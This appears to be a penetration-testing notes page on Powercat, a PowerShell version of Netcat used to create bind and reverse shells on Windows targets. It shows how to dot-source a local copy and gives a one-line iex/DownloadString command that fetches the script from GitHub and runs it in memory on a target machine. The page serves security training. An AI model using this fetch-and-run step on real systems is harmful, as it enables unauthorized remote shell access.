# Powercat

Powercat is essentially the PowerShell version of Netcat written by besimorhino. It can be thought of as a Windows PowerShell-specific version of [Socat](../socat/).

It is a script that can be downloaded to a Windows host to leverage the strengths of PowerShell and simplify the creation of bind/reverse shells.

## Download

As this is not a native tool it will (usually) be up to the attacker to arrange for this tool to be downloaded onto the target machine.

### PowerShell Invocation

#### Local Copy

To load a local copy (previously-downloaded) of powercat via [dot-sourcing](../../windows/powershell/dot-sourcing.md):

```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```

#### Remote Copy

For an Internet-connected machine the utility can be easily downloaded with the following PowerShell command.

{% code overflow="wrap" %}
```powershell
PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
{% endcode %}

&#x20;Scripts loaded in this way will only be available in the current PowerShell instance and will need to be reloaded each time we restart PowerShell.
